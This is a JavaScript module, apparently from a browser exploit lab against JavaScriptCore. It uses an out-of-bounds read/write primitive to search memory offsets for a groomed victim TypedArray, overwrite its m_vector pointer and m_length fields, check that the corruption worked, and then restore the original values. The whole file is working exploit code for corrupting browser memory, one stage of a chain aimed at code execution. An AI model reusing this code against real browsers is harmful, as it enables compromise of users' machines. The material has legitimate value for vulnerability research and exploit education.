// js/victim_corruptor.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs'; // Para Groomer.victim_object
import { JSC_OFFSETS, updateOOBConfigFromUI, OOB_CONFIG } from './config.mjs';

let _CURRENT_TEST_GAP = 0;
let _last_successful_gap = null;
const FNAME_BASE = "VictimCorruptor";

// Callbacks para atualizar a UI
let _updateCurrentGapUICallback = null;
let _updateSuccessfulGapUICallback = null;

export function getCurrentTestGap() { return _CURRENT_TEST_GAP; }
export function setCurrentTestGap(value) {
    _CURRENT_TEST_GAP = value;
    if (typeof _updateCurrentGapUICallback === 'function') {
        _updateCurrentGapUICallback(_CURRENT_TEST_GAP);
    }
}
export function getLastSuccessfulGap() { return _last_successful_gap; }
export function setLastSuccessfulGap(value) {
    _last_successful_gap = value;
    if (typeof _updateSuccessfulGapUICallback === 'function') {
        _updateSuccessfulGapUICallback(_last_successful_gap);
    }
}
export function resetLastSuccessfulGap() {
    _last_successful_gap = null;
    if (typeof _updateSuccessfulGapUICallback === 'function') {
        _updateSuccessfulGapUICallback(null);
    }
}

// Funções para serem chamadas pelo app.mjs para registrar os callbacks
export function setGapUpdateUICallback(callback) {
    _updateCurrentGapUICallback = callback;
}
export function setSuccessfulGapUpdateUICallback(callback) {
    _updateSuccessfulGapUICallback = callback;
}


async function checkVictimObjectProperties(expectedLength = null, expectedByteLength = null) {
    const FNAME_CHECK = `${FNAME_BASE}.checkVictim`;
    if (!Groomer.victim_object) {
        log("   checkVictim: Objeto vítima não definido.", "warn", FNAME_CHECK);
        return { length_ok: false, bytelength_ok: false, vector_ok: false };
    }

    let actualLength = -1;
    let actualByteLength = -1;
    let lengthOk = false;
    let byteLengthOk = false;

    try {
        actualLength = Groomer.victim_object.length;
        actualByteLength = Groomer.victim_object.byteLength;

        log(`   checkVictim: Vítima Atual - Length: ${actualLength}, ByteLength: ${actualByteLength}`, "info", FNAME_CHECK);

        if (expectedLength !== null) {
            lengthOk = (actualLength === expectedLength);
            log(`   checkVictim: Comprimento esperado ${expectedLength}, atual ${actualLength}. OK: ${lengthOk}`, lengthOk ? "good" : "warn", FNAME_CHECK);
        } else {
            lengthOk = true; // Não checando se não esperado
        }

        if (expectedByteLength !== null) {
            byteLengthOk = (actualByteLength === expectedByteLength);
            log(`   checkVictim: ByteLength esperado ${expectedByteLength}, atual ${actualByteLength}. OK: ${byteLengthOk}`, byteLengthOk ? "good" : "warn", FNAME_CHECK);
        } else {
            byteLengthOk = true; // Não checando se não esperado
        }

    } catch (e) {
        log(`   checkVictim: Erro ao acessar propriedades da vítima: ${e.message}`, "error", FNAME_CHECK);
    }
    return { length_ok: lengthOk, bytelength_ok: byteLengthOk, vector_ok: true /* placeholder */ };
}


export async function try_corrupt_fields_for_gap(gapOrRelativeOffset,
                                                 targetLength = 0x007F0000, /* ~8M elementos, um valor grande e incomum */
                                                 targetVectorPtr = new AdvancedInt64("0xcafebabe_deadbeef")) {
    const FNAME_TRY_CORRUPT = `${FNAME_BASE}.try_corrupt_fields`;
    log(`--- Tentando Corromper Campos para GAP/Offset: ${toHexS1(gapOrRelativeOffset)} (${gapOrRelativeOffset}) ---`, "test", FNAME_TRY_CORRUPT);

    if (!Core.oob_dataview_real) {
        log("ERRO CRÍTICO: Primitiva OOB não está configurada (Passo 0). Corrupção abortada.", "error", FNAME_TRY_CORRUPT);
        return false;
    }
    if (!Groomer.victim_object) {
        log("ERRO CRÍTICO: Objeto vítima (Groomer.victim_object) não preparado (Passo 1a). Corrupção abortada.", "error", FNAME_TRY_CORRUPT);
        return false;
    }

    const originalVictimLength = Groomer.victim_object.length;
    const originalVictimByteLength = Groomer.victim_object.byteLength;
    log(`   Estado Original da Vítima: Length=${originalVictimLength}, ByteLength=${originalVictimByteLength}`, "info", FNAME_TRY_CORRUPT);

    let success = false;
    let original_m_vector_val = AdvancedInt64.Zero;
    let original_m_length_val = 0;

    try {
        // 1. Ler valores originais dos campos m_vector e m_length do objeto TypedArray na memória OOB
        log("   Lendo valores originais dos campos da vítima via OOB...", "info", FNAME_TRY_CORRUPT);
        original_m_vector_val = Core.oob_read_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, 8);
        original_m_length_val = Core.oob_read_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET, 4); // length é 32-bit

        if (!isFinite(original_m_length_val) || !(original_m_vector_val instanceof AdvancedInt64)) {
             log(`   ERRO: Falha ao ler valores originais dos campos da vítima. m_vector: ${original_m_vector_val}, m_length: ${original_m_length_val}`, "error", FNAME_TRY_CORRUPT);
             return false;
        }
        log(`   Valores Originais (lidos via OOB no GAP ${toHexS1(gapOrRelativeOffset)}):`, "info", FNAME_TRY_CORRUPT);
        log(`     m_vector: ${original_m_vector_val.toString(true)}`, "ptr", FNAME_TRY_CORRUPT);
        log(`     m_length: ${toHexS1(original_m_length_val)} (${original_m_length_val})`, "info", FNAME_TRY_CORRUPT);

        // 2. Escrever novos valores para m_vector e m_length
        log(`   Escrevendo novos valores... m_vector=${targetVectorPtr.toString(true)}, m_length=${toHexS1(targetLength)}`, "info", FNAME_TRY_CORRUPT);
        Core.oob_write_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, targetVectorPtr, 8);
        Core.oob_write_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET, targetLength, 4);
        log("   Escrita OOB para campos da vítima concluída.", "good", FNAME_TRY_CORRUPT);

        // 3. Verificar se as propriedades do objeto Groomer.victim_object refletem a corrupção
        //    A mudança de m_length deve ser refletida diretamente. m_vector é mais difícil de verificar sem RCE.
        await PAUSE_LAB(50); // Pequena pausa para garantir que as mudanças se propaguem, se necessário.

        const currentVictimLength = Groomer.victim_object.length;
        log(`   Comprimento ATUAL do objeto vítima (após corrupção OOB): ${currentVictimLength}`, "info", FNAME_TRY_CORRUPT);

        if (currentVictimLength === targetLength) {
            log("   SUCESSO! Comprimento do objeto vítima corresponde ao valor escrito!", "vuln", FNAME_TRY_CORRUPT);
            success = true;
            setLastSuccessfulGap(gapOrRelativeOffset);
        } else {
            log(`   AVISO: Comprimento do objeto vítima (${currentVictimLength}) NÃO corresponde ao valor escrito (${targetLength}).`, "warn", FNAME_TRY_CORRUPT);
        }

        // Teste adicional: Tentar acessar um índice que estaria OOB para o length original, mas in-bounds para o novo
        if (success && targetLength > originalVictimLength && originalVictimLength > 0) {
            try {
                const testIndex = originalVictimLength + Math.min(10, Math.floor((targetLength - originalVictimLength)/2) ); // Um índice dentro dos novos limites
                log(`   Testando acesso em índice ${testIndex} (originalmente OOB, agora dentro dos limites)...`, "info", FNAME_TRY_CORRUPT);
                const val = Groomer.victim_object[testIndex];
                log(`   Valor lido em Groomer.victim_object[${testIndex}]: ${toHexS1(val)}`, "info", FNAME_TRY_CORRUPT);
                // Se não crashar, é um bom sinal. O valor pode ser lixo se m_vector foi alterado para um local inválido.
            } catch (e) {
                log(`   ERRO ao tentar acessar índice ${testIndex} após corrupção de length: ${e.message}`, "error", FNAME_TRY_CORRUPT);
                // Isso pode indicar que, embora length tenha mudado, m_vector não é válido ou o ArrayBuffer subjacente não foi expandido.
            }
        }


    } catch (e) {
        log(`ERRO CRÍTICO durante tentativa de corrupção: ${e.message}`, "error", FNAME_TRY_CORRUPT);
        console.error(e);
        success = false;
    } finally {
        // 4. Restaurar valores originais para permitir testes subsequentes (se a leitura foi bem-sucedida)
        if (isFinite(original_m_length_val) && original_m_vector_val instanceof AdvancedInt64 && !original_m_vector_val.isNullPtr()) {
            log("   Restaurando valores originais dos campos da vítima via OOB...", "info", FNAME_TRY_CORRUPT);
            Core.oob_write_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, original_m_vector_val, 8);
            Core.oob_write_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET, original_m_length_val, 4);
            log("   Restauração concluída.", "good", FNAME_TRY_CORRUPT);

            // Verificação rápida se a restauração do length funcionou
            await PAUSE_LAB(50);
            if (Groomer.victim_object && Groomer.victim_object.length !== originalVictimLength) {
                log(`   AVISO PÓS-RESTAURAÇÃO: Length da vítima (${Groomer.victim_object.length}) não é igual ao original (${originalVictimLength}).`, "warn", FNAME_TRY_CORRUPT);
            } else if (Groomer.victim_object) {
                 log(`   PÓS-RESTAURAÇÃO: Length da vítima (${Groomer.victim_object.length}) corresponde ao original.`, "good", FNAME_TRY_CORRUPT);
            }

        } else {
            log("   AVISO: Não foi possível restaurar valores originais (leitura inicial falhou ou ponteiro nulo).", "warn", FNAME_TRY_CORRUPT);
        }
    }
    log(`--- Tentativa de Corrupção para GAP ${toHexS1(gapOrRelativeOffset)} Concluída. Sucesso: ${success} ---`, success ? "good" : "warn", FNAME_TRY_CORRUPT);
    return success;
}


export async function findAndCorruptVictimFields_Iterative() {
    const FNAME = `${FNAME_BASE}.findAndCorruptIterative`;
    log(`--- ${FNAME} ---`, 'test', FNAME);
    updateOOBConfigFromUI(); // Garante que OOB_CONFIG está atualizado

    const startGapEl = document.getElementById('victimCorruptStartGap');
    const endGapEl = document.getElementById('victimCorruptEndGap');
    const stepGapEl = document.getElementById('victimCorruptStepGap');
    const victimSizeEl = document.getElementById('victimObjectSize'); // Usado para log

    let startGap = startGapEl ? parseInt(startGapEl.value, 10) : 0;
    let endGap = endGapEl ? parseInt(endGapEl.value, 10) : 256;
    let stepGap = stepGapEl ? parseInt(stepGapEl.value, 10) : 8;
    const victimSize = victimSizeEl ? parseInt(victimSizeEl.value, 10) : OOB_CONFIG.ALLOCATION_SIZE;

    if (isNaN(startGap)) startGap = 0;
    if (isNaN(endGap) || endGap <= startGap) endGap = startGap + 256;
    if (isNaN(stepGap) || stepGap <= 0) stepGap = 8;

    log(`Iniciando busca iterativa de GAP para corrupção: de ${startGap} a ${endGap}, passo ${stepGap}. Tamanho da vítima (para grooming): ${victimSize}`, "info", FNAME);

    if (!Groomer.victim_object) {
        log("   Preparando objeto vítima (default) antes da busca iterativa...", "info", FNAME);
        await Groomer.prepareVictim(victimSize.toString());
        if (!Groomer.victim_object) {
            log("   ERRO CRÍTICO: Falha ao preparar objeto vítima. Abortando busca iterativa.", "error", FNAME);
            return;
        }
    }

    let foundWorkingGap = false;
    resetLastSuccessfulGap(); // Reseta antes de iniciar a busca

    const btn = document.getElementById('btnFindAndCorruptIterative');
    if(btn) btn.disabled = true;

    for (let currentGap = startGap; currentGap <= endGap; currentGap += stepGap) {
        setCurrentTestGap(currentGap); // Atualiza UI
        log(`Testando GAP: ${toHexS1(currentGap)} (${currentGap})`, "subtest", FNAME);
        const success = await try_corrupt_fields_for_gap(currentGap);
        if (success) {
            log(`SUCESSO SIGNIFICATIVO: GAP ${toHexS1(currentGap)} permitiu corrupção verificável de m_length!`, "vuln", FNAME);
            foundWorkingGap = true;
            // Não paramos no primeiro sucesso para permitir que o usuário veja outros possíveis GAPs
            // setLastSuccessfulGap já foi chamado dentro de try_corrupt_fields_for_gap
        }
        await PAUSE_LAB(100); // Pausa entre tentativas
        if (document.hidden) {
             log("Busca iterativa de GAP interrompida pois a página ficou oculta.", "warn", FNAME);
             break;
        }
    }
    if(btn) btn.disabled = false;

    if (foundWorkingGap) {
        log(`Busca iterativa concluída. Pelo menos um GAP funcional foi encontrado (último sucesso: ${toHexS1(getLastSuccessfulGap())}).`, "good", FNAME);
    } else {
        log("Busca iterativa concluída. Nenhum GAP causou um crash/exceção óbvia ou mudança de length verificável que tenha sido classificada como 'sucesso'.", "warn", FNAME);
    }
    setCurrentTestGap(0); // Reseta display da UI
}

export async function testCorruptKnownGapButtonHandler() {
    const FNAME_TCKG_BTN = `${FNAME_BASE}.testCorruptKnownGapBtn`;
    const gapInputEl = document.getElementById('gap_to_test_input');
    let gapToTest;

    if (gapInputEl && gapInputEl.value.trim() !== "") {
        const gapStr = gapInputEl.value.trim();
        if (gapStr.toLowerCase().startsWith("0x")) {
            gapToTest = parseInt(gapStr, 16);
        } else {
            gapToTest = parseInt(gapStr, 10);
        }
        if (isNaN(gapToTest)) {
            log(`Valor do GAP no input '${gapStr}' é inválido. Tentando usar último GAP de sucesso se disponível.`, "warn", FNAME_TCKG_BTN);
            gapToTest = getLastSuccessfulGap();
        }
    } else {
        gapToTest = getLastSuccessfulGap();
    }

    if (gapToTest === null || isNaN(gapToTest)) {
        log("Nenhum GAP válido (último sucesso ou input) para testar. Forneça um GAP no campo 'GAP para Teste Direto'.", "error", FNAME_TCKG_BTN);
        return;
    }

    // Atualiza o input para refletir o valor que será usado, se veio do 'lastSuccessfulGap'
    if (gapInputEl && (gapInputEl.value.trim() === "" || isNaN(parseInt(gapInputEl.value.trim().toLowerCase().startsWith("0x") ? gapInputEl.value.trim() : gapInputEl.value.trim(), gapInputEl.value.trim().toLowerCase().startsWith("0x") ? 16 : 10)) ) ) {
        gapInputEl.value = gapToTest.toString(); // Atualiza com o valor numérico
    }


    log(`--- ${FNAME_TCKG_BTN}: Testando GAP ${toHexS1(gapToTest)} (${gapToTest}) ---`, 'test', FNAME_TCKG_BTN);
    setCurrentTestGap(gapToTest); // Atualiza UI

    const btn = document.getElementById('btnTestCorruptKnownGap');
    if(btn) btn.disabled = true;

    const success = await try_corrupt_fields_for_gap(gapToTest);

    if(btn) btn.disabled = false;
    setCurrentTestGap(0); // Reseta display da UI

    if (success) {
        log(`Corrupção em GAP conhecido ${toHexS1(gapToTest)} foi BEM-SUCEDIDA (m_length alterado).`, "vuln", FNAME_TCKG_BTN);
    } else {
        log(`Corrupção em GAP conhecido ${toHexS1(gapToTest)} FALHOU ou não foi verificável.`, "warn", FNAME_TCKG_BTN);
    }
}
